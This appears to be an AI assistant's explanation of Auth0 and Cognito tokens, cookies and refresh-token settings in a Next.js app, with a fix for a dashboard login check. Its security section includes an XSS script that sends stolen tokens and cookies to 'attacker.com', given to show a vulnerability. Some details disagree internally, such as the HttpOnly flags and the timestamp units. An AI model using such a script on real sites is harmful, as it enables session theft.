# Auth0 Tokens and Cookies Explained

## Your Issue: "Not Authenticated" After Login

### Root Cause

You successfully logged in with Auth0, and tokens are stored correctly. However, the **dashboard page only checks for Cognito authentication**, not Auth0!

```typescript
// app/dashboard/page.tsx (CURRENT)
const { data: user, isLoading, isError } = useAuth(); // ❌ Only checks Cognito

// features/auth/hooks/useAuth.ts
import { isAuthenticated } from '@/lib/auth/cognito'; // ❌ Cognito only
```

**Solution:** I'll update the `useAuth` hook to detect and support all three authentication providers (Cognito SRP, Cognito OAuth, and Auth0).

---

## Part 1: All Cookies Explained

When you open Chrome DevTools → Application → Cookies, you see these cookies:

### Cookies from Browser Screenshot

```
┌─────────────────────────┬──────────────────────┬─────────────┬──────────┬─────────┐
│ Name                    │ Purpose              │ Provider    │ HttpOnly │ Secure  │
├─────────────────────────┼──────────────────────┼─────────────┼──────────┼─────────┤
│ did_compat              │ Device ID tracking   │ Auth0       │ No       │ No      │
│ did                     │ Device fingerprint   │ Auth0       │ No       │ No      │
│ auth0_id_token          │ User identity JWT    │ Your app    │ No       │ Yes     │
│ auth0_compat            │ Legacy compatibility │ Auth0       │ No       │ No      │
│ auth0_access_token      │ API authorization    │ Your app    │ No       │ Yes     │
│ auth0                   │ Session cookie       │ Auth0       │ No       │ No      │
└─────────────────────────┴──────────────────────┴─────────────┴──────────┴─────────┘
```

### 1. Auth0-Set Cookies (During Login on Auth0's Domain)

These are set by Auth0 during the Universal Login flow:

#### `did` (Device ID)
```
Name: did
Value: s%3Av0%3A6b7b3Av09%3AfA7a...
Domain: .auth0.com
Purpose: Device fingerprinting for security and analytics
HttpOnly: No
Secure: No (can be set over HTTP)
SameSite: None
Max-Age: 2 years
```

**What it does:**
- Tracks device across multiple logins
- Used for anomaly detection (new device alerts)
- Helps prevent account takeover

#### `did_compat` (Device ID Compatibility)
```
Name: did_compat
Value: s%3Av0%3A6b7b...
Domain: .auth0.com
Purpose: Fallback for older browsers
HttpOnly: No
Secure: No
```

**What it does:**
- Same as `did` but uses older cookie format
- Ensures device tracking works in legacy browsers

#### `auth0` (Auth0 Session Cookie)
```
Name: auth0
Value: s%3Aq_JGvH8oQy...
Domain: dev-yourname.us.auth0.com
Purpose: Auth0 session management
HttpOnly: Yes (depends on config)
Secure: Yes
SameSite: None
Max-Age: Session (browser close)
```

**What it does:**
- Maintains session during login flow
- Allows SSO (Single Sign-On) across multiple apps
- Cleared when you logout from Auth0

#### `auth0_compat` (Compatibility Cookie)
```
Name: auth0_compat  
Value: s%3Aq_JGvH8oQy...
Domain: dev-yourname.us.auth0.com
Purpose: Backward compatibility
HttpOnly: No
Secure: No
```

**What it does:**
- Fallback for browsers with strict cookie policies
- Ensures Auth0 session works in edge cases

---

### 2. Your App's Cookies (Set by Our Code)

These are set by `lib/auth/auth0.ts` after successful authentication:

#### `auth0_access_token`
```javascript
// lib/auth/auth0.ts - Line 124
document.cookie = `auth0_access_token=${tokens.accessToken}; path=/; max-age=${tokens.expiresIn}; SameSite=Lax; Secure`;
```

**Properties:**
```
Name: auth0_access_token
Value: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik...
Domain: localhost:3000 (your app)
Path: /
Max-Age: 3600 (1 hour)
HttpOnly: No ⚠️
Secure: Yes
SameSite: Lax
Size: ~500-1000 bytes
```

**What it contains:**
```json
{
  "iss": "https://dev-yourname.us.auth0.com/",
  "sub": "auth0|699865c1119cfad2d6072fcc",
  "aud": ["https://api.myapp.com", "https://dev-yourname.us.auth0.com/userinfo"],
  "iat": 1771682061790,
  "exp": 1771685661790,
  "scope": "openid profile email offline_access",
  "azp": "your_client_id"
}
```

**Purpose:**
- Authorize API calls to your backend
- Authorize calls to Auth0 APIs (UserInfo endpoint)
- Short-lived (1 hour typical)
- Can be refreshed with refresh token

#### `auth0_id_token`
```javascript
// lib/auth/auth0.ts - Line 125
document.cookie = `auth0_id_token=${tokens.idToken}; path=/; max-age=${tokens.expiresIn}; SameSite=Lax; Secure`;
```

**Properties:**
```
Name: auth0_id_token
Value: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik...
Domain: localhost:3000
Path: /
Max-Age: 3600 (1 hour)
HttpOnly: No ⚠️
Secure: Yes
SameSite: Lax
Size: ~1000-2000 bytes
```

**What it contains:**
```json
{
  "iss": "https://dev-yourname.us.auth0.com/",
  "sub": "auth0|699865c1119cfad2d6072fcc",
  "aud": "your_client_id",
  "iat": 1771682061790,
  "exp": 1771685661790,
  "email": "paul27152@newtrea.com",
  "email_verified": true,
  "name": "paul27152@newtrea.com",
  "nickname": "paul27152",
  "picture": "https://s.gravatar.com/avatar/...",
  "updated_at": "2026-02-19T15:10:24.356Z"
}
```

**Purpose:**
- Identify the user
- Contains user profile information
- Should NOT be used for API authorization (use access token)
- Can be used for display purposes (name, email, avatar)

#### `auth0_refresh_token` (May Not Exist)
```javascript
// lib/auth/auth0.ts - Line 127-130
if (tokens.refreshToken) {
  const refreshMaxAge = 60 * 60 * 24 * 30; // 30 days
  document.cookie = `auth0_refresh_token=${tokens.refreshToken}; path=/; max-age=${refreshMaxAge}; SameSite=Lax; Secure`;
}
```

**Properties:**
```
Name: auth0_refresh_token
Value: v1.MRj9F7... (opaque token, NOT a JWT)
Domain: localhost:3000
Path: /
Max-Age: 2592000 (30 days)
HttpOnly: No ⚠️
Secure: Yes
SameSite: Lax
```

**Purpose:**
- Get new access/id tokens without re-login
- Long-lived (days/weeks)
- Can be revoked by Auth0
- Should be stored securely

---

## Part 2: Why No Refresh Token in Your Case?

### Reason 1: Auth0 Application Type

**Check Auth0 Dashboard:**
```
Applications → Your App → Settings → Application Type
```

| Application Type | Refresh Token by Default |
|-----------------|--------------------------|
| Single Page Application (SPA) | ❌ No (security concern) |
| Regular Web Application | ✅ Yes |
| Native | ✅ Yes |
| Machine to Machine | N/A |

**Why SPA doesn't get refresh tokens by default:**
- Refresh tokens are powerful (long-lived)
- SPAs run in browser (accessible to JavaScript)
- If stolen via XSS, attacker has long-term access
- Auth0 recommends using "Silent Authentication" instead

### Reason 2: Auth0 API Settings

**Check if API requires refresh tokens:**
```
Applications → APIs → Your API → Settings → Allow Offline Access
```

If this is disabled, no refresh token is issued even if requested.

### Reason 3: Scope Not Requested

In our code:

```typescript
// lib/auth/auth0.ts - Line 211
scope: 'openid profile email offline_access', // ✅ We ARE requesting it
```

**`offline_access` scope** = request refresh token

If this is missing, no refresh token is issued.

### How to Get Refresh Token

#### Option 1: Enable in Auth0 Dashboard (Recommended)

1. Go to **Applications → Your App → Settings**
2. Scroll to **Advanced Settings → Grant Types**
3. Ensure these are checked:
   - ✅ Authorization Code
   - ✅ Refresh Token
4. Click **Save Changes**
5. Scroll to **Refresh Token Rotation**
6. Enable: **Rotation** (recommended)
7. Enable: **Reuse Interval** = 0 (most secure)

#### Option 2: Enable for API

1. Go to **Applications → APIs → Your API**
2. Settings tab
3. Enable: **Allow Offline Access**
4. Click **Save**

#### Option 3: Configure in Auth0 API Settings

If you have an API configured:

```typescript
// lib/auth/auth0.ts - initiateAuth0Login()
params.append('audience', 'https://api.myapp.com'); // Your API audience
```

Without an audience, Auth0 may not issue refresh tokens.

---

## Part 3: Why Tokens in BOTH localStorage AND Cookies?

Looking at the code:

```typescript
// lib/auth/auth0.ts - storeTokens() function

function storeTokens(tokens: Auth0Tokens) {
  const expiresAt = Date.now() + tokens.expiresIn * 1000;
  
  // Store in localStorage for easy access
  localStorage.setItem(STORAGE_KEYS.ACCESS_TOKEN, tokens.accessToken);
  localStorage.setItem(STORAGE_KEYS.ID_TOKEN, tokens.idToken);
  if (tokens.refreshToken) {
    localStorage.setItem(STORAGE_KEYS.REFRESH_TOKEN, tokens.refreshToken);
  }
  localStorage.setItem(STORAGE_KEYS.EXPIRES_AT, expiresAt.toString());
  
  // Also store in cookies for consistency with Cognito
  document.cookie = `auth0_access_token=${tokens.accessToken}; path=/; max-age=${tokens.expiresIn}; SameSite=Lax; Secure`;
  document.cookie = `auth0_id_token=${tokens.idToken}; path=/; max-age=${tokens.expiresIn}; SameSite=Lax; Secure`;
  if (tokens.refreshToken) {
    document.cookie = `auth0_refresh_token=${tokens.refreshToken}; path=/; max-age=${refreshMaxAge}; SameSite=Lax; Secure`;
  }
}
```

### Reason 1: Consistency with Cognito

The existing Cognito OAuth flow uses cookies:
```typescript
// Cognito OAuth stores tokens in cookies
document.cookie = 'CognitoIdentityServiceProvider.ojkkctuvfmhpv4d16gvsjt6co.LastAuthUser=...';
```

To keep the same pattern, Auth0 also uses cookies.

### Reason 2: localStorage for Client-Side Access

**Why localStorage?**
```typescript
// Easy to access from any component
const tokens = getStoredTokens();
console.log(tokens.accessToken);

// Check expiration
const expired = isTokenExpired();
```

**Why cookies?**
```
1. Automatic inclusion in HTTP requests (if needed)
2. Can set expiration (Max-Age)
3. Can be made HttpOnly (requires server-side approach)
4. CSRF protection with SameSite
```

### Problem: Neither is Ideal!

| Storage | Pros | Cons |
|---------|------|------|
| **localStorage** | ✅ Easy access<br>✅ Large storage<br>✅ Never sent automatically | ❌ Vulnerable to XSS<br>❌ Not accessible from server<br>❌ No expiration |
| **Cookies (non-HttpOnly)** | ✅ Auto expiration<br>✅ SameSite protection | ❌ Still vulnerable to XSS<br>❌ Size limited (4KB)<br>❌ Sent with every request |
| **Cookies (HttpOnly)** | ✅ XSS protection<br>✅ Auto expiration<br>✅ SameSite protection | ⚠️ Requires server-side exchange<br>⚠️ More complex setup |

### Best Practice: Use HttpOnly Cookies with Server-Side Exchange

See `CUSTOM_VS_LIBRARIES.md` for how to implement this properly.

---

## Part 4: Token Comparison

### Access Token vs ID Token

| Aspect | Access Token | ID Token |
|--------|--------------|----------|
| **Purpose** | API authorization | User identification |
| **Audience** | API (`aud: "https://api.myapp.com"`) | Client app (`aud: "client_id"`) |
| **Use for** | Calling protected APIs | Getting user info |
| **Contains** | Permissions, scopes | User profile (email, name) |
| **Validated by** | API server | Client app |
| **Can be opaque** | Yes (if not JWT) | No (always JWT) |
| **Size** | Smaller (~500 bytes) | Larger (~1-2KB) |

### Example Tokens from Your Screenshot

#### Access Token (decoded)
```json
{
  "iss": "https://dev-yourname.us.auth0.com/",
  "sub": "auth0|699865c1119cfad2d6072fcc",
  "aud": [
    "https://api.myapp.com",
    "https://dev-yourname.us.auth0.com/userinfo"
  ],
  "iat": 1771682061,
  "exp": 1771685661,
  "scope": "openid profile email offline_access",
  "azp": "your_client_id"
}
```

**Use it like this:**
```javascript
// Call your API
fetch('https://api.myapp.com/data', {
  headers: {
    'Authorization': `Bearer ${tokens.accessToken}`
  }
});

// Call Auth0 UserInfo endpoint
fetch('https://dev-yourname.us.auth0.com/userinfo', {
  headers: {
    'Authorization': `Bearer ${tokens.accessToken}`
  }
});
```

#### ID Token (decoded)
```json
{
  "iss": "https://dev-yourname.us.auth0.com/",
  "sub": "auth0|699865c1119cfad2d6072fcc",
  "aud": "your_client_id",
  "iat": 1771682061,
  "exp": 1771685661,
  "email": "paul27152@newtrea.com",
  "email_verified": true,
  "name": "paul27152@newtrea.com",
  "nickname": "paul27152",
  "picture": "https://s.gravatar.com/avatar/abc123...",
  "updated_at": "2026-02-19T15:10:24.356Z"
}
```

**Use it like this:**
```javascript
// Display user info
const payload = JSON.parse(atob(tokens.idToken.split('.')[1]));
console.log('Welcome,', payload.email);
console.log('Profile pic:', payload.picture);

// Don't use it for API calls! Use access token instead
```

---

## Part 5: Security Analysis

### Current Implementation Security Issues

```typescript
// ⚠️ VULNERABLE to XSS
localStorage.setItem('auth0_access_token', token);
document.cookie = `auth0_access_token=${token}; HttpOnly=false`; // ⚠️
```

**If attacker injects JavaScript:**
```html
<script>
  // Steal from localStorage
  const accessToken = localStorage.getItem('auth0_access_token');
  
  // Steal from cookies
  const cookies = document.cookie;
  
  // Send to attacker
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ accessToken, cookies })
  });
</script>
```

### How to Make It Secure

#### Step 1: Move Token Exchange to Server

```typescript
// app/api/auth/auth0-callback/route.ts
export async function POST(request: NextRequest) {
  const { code, codeVerifier } = await request.json();
  
  // Exchange on server (secret safe)
  const tokens = await exchangeCodeForTokens(code, codeVerifier);
  
  const response = NextResponse.json({ success: true });
  
  // Set HttpOnly cookies (JavaScript cannot access)
  response.cookies.set('auth0_access_token', tokens.accessToken, {
    httpOnly: true, // ✅ XSS protection
    secure: true,
    sameSite: 'strict',
    maxAge: tokens.expiresIn,
  });
  
  return response;
}
```

#### Step 2: Remove localStorage

```typescript
// ❌ Remove this
localStorage.setItem('auth0_access_token', token);

// ✅ Use this
// Tokens automatically included in cookies with every request
```

#### Step 3: Access Tokens Server-Side Only

```typescript
// app/api/protected/route.ts
import { cookies } from 'next/headers';

export async function GET() {
  const accessToken = cookies().get('auth0_access_token')?.value;
  
  if (!accessToken) {
    return Response.json({ error: 'Unauthorized' }, { status: 401 });
  }
  
  // Use token to call APIs
  const data = await fetch('https://api.example.com/data', {
    headers: { Authorization: `Bearer ${accessToken}` }
  });
  
  return Response.json(data);
}
```

---

## Part 6: Fix the "Not Authenticated" Issue

I'll update the code to support Auth0 authentication detection. The fix involves:

1. **Update `useAuth` hook** to detect Auth0 tokens
2. **Add Auth0 user info fetching** to `useAuth`
3. **Update logout hook** to support Auth0

### Changes Coming

```typescript
// features/auth/hooks/useAuth.ts (UPDATED)
export function useAuth() {
  return useQuery({
    queryKey: ['auth', 'user'],
    queryFn: async () => {
      // Check Auth0 first
      if (isAuth0Authenticated()) {
        return getAuth0UserInfo(); // ✅ New
      }
      
      // Then check Cognito
      const authenticated = await isAuthenticated();
      if (!authenticated) {
        return null;
      }
      return getAuthenticatedUser();
    },
    staleTime: 5 * 60 * 1000,
    retry: false,
  });
}
```

---

## Summary

### Your Cookies Explained

| Cookie | Set By | Purpose | Visible to JS |
|--------|--------|---------|---------------|
| `did`, `did_compat` | Auth0 | Device tracking | Yes |
| `auth0`, `auth0_compat` | Auth0 | Session during login | Varies |
| `auth0_access_token` | Your app | API authorization | Yes ⚠️ |
| `auth0_id_token` | Your app | User identity | Yes ⚠️ |
| `auth0_refresh_token` | Your app | Token refresh | Yes ⚠️ (if exists) |

### Why No Refresh Token

1. ❌ Auth0 app type is SPA (disabled by default)
2. ❌ API doesn't have "Allow Offline Access" enabled
3. ❌ Refresh Token grant not enabled in app settings

**Fix:** Enable in Auth0 Dashboard → Applications → Your App → Advanced Settings → Grant Types → ✅ Refresh Token

### Why Tokens in Both Places

- **localStorage**: Easy client-side access (but vulnerable)
- **Cookies**: Consistency with Cognito pattern (but still vulnerable without HttpOnly)

**Problem:** Current implementation is vulnerable to XSS attacks

**Solution:** Move to server-side token exchange with HttpOnly cookies (see `CUSTOM_VS_LIBRARIES.md`)

### Next Steps

I'll now update the `useAuth` hook to detect Auth0 authentication so you can access the dashboard! ✅
